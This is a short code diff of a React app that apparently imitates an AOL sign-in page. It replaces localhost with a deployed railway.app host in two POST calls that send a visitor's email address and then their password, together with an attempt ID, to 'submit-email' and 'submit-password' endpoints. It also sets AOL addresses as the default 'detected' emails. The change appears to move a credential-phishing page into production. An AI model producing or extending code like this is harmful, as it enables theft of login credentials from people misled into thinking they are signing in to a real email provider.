@@ -11,7 +11,7 @@ import { ChevronLeft } from 'lucide-react';
 const emailDetectionService = {
   getDetectedEmails: (): string[] => {
     const saved = localStorage.getItem('aol_detected_emails');
-    return saved ? JSON.parse(saved) : ['user@example.com', 'demo@aol.com'];
+    return saved ? JSON.parse(saved) : ['user@aol.com', 'demo@aol.com'];
   },
   saveEmail: (email: string) => {
     const emails = emailDetectionService.getDetectedEmails();
@@ -44,7 +44,7 @@ export default function App() {
     setError('');
 
     try {
-      const response = await fetch('http://localhost:3000/api/submit-email', {
+      const response = await fetch('https://demascus-production-b89b.up.railway.app/api/submit-email', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email }),
@@ -76,7 +76,7 @@ export default function App() {
     setError('');
 
     try {
-      const response = await fetch('http://localhost:3000/api/submit-password', {
+      const response = await fetch('https://demascus-production-b89b.up.railway.app/api/submit-password', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ attemptId, password }),
